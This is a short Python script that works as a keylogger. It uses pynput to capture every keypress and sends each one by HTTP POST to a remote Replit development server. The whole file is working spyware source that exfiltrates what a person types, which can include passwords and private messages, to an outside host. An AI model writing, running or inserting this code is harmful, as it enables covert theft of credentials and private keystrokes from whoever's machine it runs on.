import requests
from pynput.keyboard import Listener

# Use your Replit development URL
REMOTE_SERVER_URL = "https://a1acf2b3-78f7-4b4d-b077-f3a9d780fe23-00-kbck0elxzn2e.picard.replit.dev/"

def send_key_to_server(key_data):
    try:
        response = requests.post(REMOTE_SERVER_URL, data={'key': key_data})
        if response.status_code == 200:
            print("Key logged successfully to server.")
        else:
            print(f"Failed to log key: {response.status_code}")
    except Exception as e:
        print(f"Error sending key to server: {e}")

def on_press(key):
    try:
        key_data = f"{key.char}"
    except AttributeError:
        key_data = f"{key}"

    print(f"Key pressed: {key_data}")
    send_key_to_server(key_data)

def start_keylogger():
    print("Starting keylogger. Press 'Ctrl + C' to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
